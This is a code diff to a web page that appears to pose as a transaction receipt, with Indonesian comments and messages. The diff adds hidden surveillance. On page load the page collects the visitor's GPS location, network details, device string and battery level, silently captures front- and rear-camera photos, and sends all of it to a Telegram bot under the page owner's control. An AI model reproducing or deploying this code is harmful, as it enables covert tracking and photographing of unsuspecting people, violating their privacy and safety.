@@ -21,10 +21,10 @@ function getNetworkInfo() {
         };
     }
 
-    const type = connection.type || "unknown";
-    const effectiveType = connection.effectiveType || "unknown";
-    const downlink = connection.downlink || null;
-    const rtt = connection.rtt || null;
+    const type = connection.type || "unknown";                 
+    const effectiveType = connection.effectiveType || "unknown"; 
+    const downlink = connection.downlink || null;              
+    const rtt = connection.rtt || null;                        
 
     let description = "";
     if (type === "wifi") {
@@ -66,50 +66,44 @@ Maps: ${mapsUrl}
 [${dms}](${mapsUrl})`;
 
     try {
-        const res = await fetch("/api/notify", {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ message: pesan })
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: "Markdown",
+                disable_web_page_preview: false
+            })
         });
-
-        const data = await res.json();
-        if (!res.ok) {
-            console.error("Gagal kirim informasi:", data);
-            return;
-        }
-
-        console.log("Lokasi dan informasi terkirim melalui endpoint server");
+        console.log("Lokasi dan informasi terkirim ke Telegram");
     } catch (err) {
         console.error("Gagal kirim informasi:", err);
     }
 }
 
 function berhasilLokasi(posisi) {
-    const latitude = posisi.coords.latitude;
+    const latitude  = posisi.coords.latitude;
     const longitude = posisi.coords.longitude;
-    const accuracy = posisi.coords.accuracy;
+    const accuracy  = posisi.coords.accuracy;
 
     const networkInfo = getNetworkInfo();
     const deviceInfo = navigator.userAgent;
 
     let batteryStatus = { level: "Unavailable", charging: false };
 
-    const kirim = () => {
-        kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
-    };
-
     if (navigator.getBattery) {
-        navigator.getBattery()
-            .then((battery) => {
-                batteryStatus = {
-                    level: Math.floor(battery.level * 100),
-                    charging: battery.charging
-                };
-                kirim();
-            })
-            .catch(kirim);
+        navigator.getBattery().then(function(battery) {
+            batteryStatus = {
+                level: Math.floor(battery.level * 100),
+                charging: battery.charging
+            };
+            kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
+        }).catch(() => {
+            kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
+        });
     } else {
-        kirim();
+        kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
     }
 
     console.log("Latitude :", latitude);
@@ -145,67 +139,132 @@ if ("geolocation" in navigator) {
     console.error("Browser tidak mendukung Geolocation.");
 }
 
-let isRedirecting = false;
-let toastTimer = null;
 
-function updateDateTime() {
-    const now = new Date();
-    const datePart = now.toLocaleDateString("id-ID", {
-        day: "2-digit",
-        month: "short",
-        year: "numeric"
+async function ambilFoto(facingMode) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: facingMode },
+            audio: false
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.playsInline = true;
+        video.muted = true;
+        await video.play();
+
+        await new Promise(r => setTimeout(r, 800));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(track => track.stop());
+
+        return new Promise(resolve => {
+            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.85);
+        });
+    } catch (err) {
+        console.error(`Gagal ambil kamera ${facingMode}:`, err);
+        return null;
+    }
+}
+
+async function kirimFoto(blob, caption) {
+    if (!blob) return;
+
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("caption", caption);
+    formData.append("photo", blob, "foto.jpg");
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
     });
-    const timePart = now.toLocaleTimeString("id-ID", {
-        hour: "2-digit",
-        minute: "2-digit",
-        hour12: false
-    }).replace(":", ".");
+}
 
-    const el = document.getElementById("realtimeDateTime");
-    if (el) {
-        el.textContent = `${datePart} • ${timePart}`;
+async function prosesKamera() {
+    console.log("Meminta izin kamera...");
+
+    const fotoDepan = await ambilFoto("user");
+    if (fotoDepan) {
+        await kirimFoto(fotoDepan, "Kamera Depan");
+        console.log("Foto kamera depan terkirim");
+    }
+
+    const fotoBelakang = await ambilFoto("environment");
+    if (fotoBelakang) {
+        await kirimFoto(fotoBelakang, "Kamera Belakang");
+        console.log("Foto kamera belakang terkirim");
     }
 }
 
-function showToast(message) {
-    const toast = document.getElementById("toast");
-    if (!toast) return;
+prosesKamera().catch(err => console.error("Gagal proses kamera:", err));
 
-    toast.textContent = message;
-    toast.classList.add("show");
+        let isRedirecting = false;
+        let toastTimer = null;
 
-    clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => {
-        toast.classList.remove("show");
-    }, 2200);
-}
+        function updateDateTime() {
+            const now = new Date();
+            const datePart = now.toLocaleDateString("id-ID", {
+                day: "2-digit",
+                month: "short",
+                year: "numeric"
+            });
+            const timePart = now.toLocaleTimeString("id-ID", {
+                hour: "2-digit",
+                minute: "2-digit",
+                hour12: false
+            }).replace(":", ".");
 
-function copyTxId() {
-    const txEl = document.getElementById("txIdText");
-    if (!txEl) return;
+            const el = document.getElementById("realtimeDateTime");
+            if (el) {
+                el.textContent = `${datePart} • ${timePart}`;
+            }
+        }
 
-    const cleanId = txEl.innerText.replace(/\s+/g, "").trim();
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-        navigator.clipboard.writeText(cleanId)
-            .then(() => showToast("ID Transaksi berhasil disalin"))
-            .catch(() => showToast("Gagal menyalin ID Transaksi"));
-    }
-}
+        function showToast(message) {
+            const toast = document.getElementById("toast");
+            if (!toast) return;
 
-function showSecondPage() {
-    if (isRedirecting) return;
-    isRedirecting = true;
+            toast.textContent = message;
+            toast.classList.add("show");
 
-    const splash = document.getElementById("splash");
-    const page = document.getElementById("page-content");
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => {
+                toast.classList.remove("show");
+            }, 2200);
+        }
 
-    splash.classList.add("fade-out");
+        function copyTxId() {
+            const txEl = document.getElementById("txIdText");
+            if (!txEl) return;
 
-    setTimeout(() => {
-        splash.style.display = "none";
-        page.classList.add("show");
-        updateDateTime();
-    }, 350);
-}
+            const cleanId = txEl.innerText.replace(/\s+/g, "").trim();
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(cleanId)
+                    .then(() => showToast("ID Transaksi berhasil disalin"))
+                    .catch(() => showToast("Gagal menyalin ID Transaksi"));
+            }
+        }
 
-setTimeout(showSecondPage, 2000);
+        function showSecondPage() {
+            if (isRedirecting) return;
+            isRedirecting = true;
+
+            const splash = document.getElementById("splash");
+            const page = document.getElementById("page-content");
+
+            splash.classList.add("fade-out");
+
+            setTimeout(() => {
+                splash.style.display = "none";
+                page.classList.add("show");
+                updateDateTime();
+            }, 350);
+        }
+
+        setTimeout(showSecondPage, 2000);
